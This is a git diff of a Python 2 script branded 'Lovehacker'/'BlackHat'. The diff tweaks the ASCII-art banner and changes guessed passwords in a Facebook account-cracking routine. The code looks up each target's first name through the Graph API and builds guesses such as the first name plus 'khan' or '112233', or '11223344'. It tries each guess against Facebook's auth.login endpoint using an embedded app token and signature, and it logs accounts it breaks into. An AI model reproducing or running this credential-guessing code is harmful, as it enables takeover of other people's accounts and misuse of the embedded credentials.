@@ -52,7 +52,7 @@ def jalan(z):
 ##### LOGO #####																																																							
 logo = """																																																							
        \033[1;96m  ╭━━━━━━━╮             ╭━━━━━━━╮																																																							
-      \033[1;96m   ┃   ●  ══  ┃            ┃   ●  ══  ┃ 																																																							
+      \033[1;96m   ┃  ●  ══ ┃             ┃  ●  ══ ┃ 																																																							
      \033[1;96m    ┃███████┃             ┃███████┃																																																					
     \033[1;96m     ┃███████┃             ┃███████┃																																																					
    \033[1;96m      ┃███████┃             ┃███████┃																																																						
@@ -61,14 +61,14 @@ logo = """
     \033[1;96m     ┃███████┃             ┃███████┃
      \033[1;96m    ┃███████┃             ┃███████┃
      \033[1;96m    ┃███████┃             ┃███████┃
-      \033[1;96m   ┃     ○     ┃            ┃     ○     ┃
+      \033[1;96m   ┃    ○    ┃            ┃     ○    ┃
        \033[1;96m  ╰━━━━━━━╯             ╰━━━━━━━╯																																																						
   \033[1;92m:•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;94mWhatsApp Numb\033[1;93m+923094161457\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																																							
-\033[1;95m      ◢▇◣◢▇◣             	 ◢▇◣◢▇◣																																																					
+\033[1;95m       ◢▇◣◢▇◣          ◢▇◣◢▇◣																																																					
 \033[1;95m	▇▇▇▇▇▇                ▇▇▇▇▇▇																																																						
 \033[1;95m	◥▇▇▇▇◤\033[1;96m>>>Lovehacker>>>\033[1;95m◥▇▇▇▇◤																																																				
 \033[1;95m        ◥▇▇◤                   ◥▇▇◤         \033[1;92mPakistan																																																							
-\033[1;95m 	    ◥◤		             ◥◤																																																			
+\033[1;95m     ◥◤		            ◥◤																																																			
 \033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•"""																																																							
 																																																							
 def tik():																																																							
@@ -94,7 +94,7 @@ print  """
  \033[1;92m ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┃┏━┓┃┃┃┣━┓┣━┓┃┗┛┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•   																																																							
  \033[1;92m ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┃┗━┛┃┗┛┃┗┛┃┗┛┃┏┓┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																																							
  \033[1;92m ┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•┈┈┈┈┈┈┈┗━━━┻━━┻━━┻━━┛┗┛┈┈┈┈┈┈┈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																																							
-  \033[1;92m ───•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•  																																																							
+  \033[1;92m ───•◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈••◈•ᑕᑐᑕᑐᑕᑐᑕᑐ•◈•◈•  																																																							
    \033[1;93m███████▒▒\033[1;96mWelcome To BlackHat\033[1;93m▒▒████████																																																							
 \033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•\033[1;96mBlackHat\033[1;92m•◈•ᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐᑕᑐ•◈•																																																							
 \033[1;94mAuthor\033[1;91m: \033[1;91mlovehacker																																																							
@@ -445,7 +445,7 @@ def pilih_super():
 																					cek.close()																																		
 																					cekpoint.append(user+pass9)																																		
 																				else:																																			
-																					pass10 = b['first_name'] + '007'																																		
+																					pass10 = b['first_name'] + 'khan'																																		
 																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")																																		
 																					q = json.load(data)																																		
 																					if 'access_token' in q:																																		
@@ -487,7 +487,7 @@ def pilih_super():
 																											cek.close()																												
 																											cekpoint.append(user+pass12)																												
 																										else:																													
-																											pass13 = 'muhamad786'																												
+																											pass13 = '11223344'																												
 																											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")																												
 																											q = json.load(data)																												
 																											if 'access_token' in q:																												
@@ -503,7 +503,7 @@ def pilih_super():
 																												else:																											
 																													a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)																										
 																													b = json.loads(a.text)																										
-																													pass14 = b['first_name'] + '0000'																										
+																													pass14 = b['first_name'] + '112233'																										
 																													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")																										
 																													q = json.load(data)																										
 																													if 'access_token' in q:																										
